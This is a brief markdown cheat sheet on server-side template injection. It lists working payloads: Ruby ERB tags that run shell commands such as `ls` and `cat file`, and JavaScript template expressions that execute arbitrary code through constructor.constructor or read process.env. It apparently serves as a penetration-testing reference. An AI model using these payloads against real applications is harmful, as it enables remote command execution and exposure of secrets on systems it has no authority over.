# SSTI  
*  [Ruby erb injection](#ruby-erb-injection)  
   *  [Find](#find)
   *  [Exploit](#exploit)   
*  [JS template injection](#js-template-injection)  
   *  [Exploit](#exploit)  
   
# Ruby erb injection
The erb(ruby-based) template injection.  

## Find  
```ruby
// based in ERB documentation
<%= syntax of Ruby statement %>
```
`<%= 2*2 %>` to test whether get the result of 4.  

## Exploit
```ruby
// <%= is same as <?=
<%=`ls`%>
<%=`cat file`%>
```

# js template injection
```{{ code }}```  
  
## Exploit
```js
{{ constructor.constructor("alert('xss')")() }}
{{ process.env.global_variable }}
```
[Reference](https://github.com/dotboris/vuejs-serverside-template-xss)
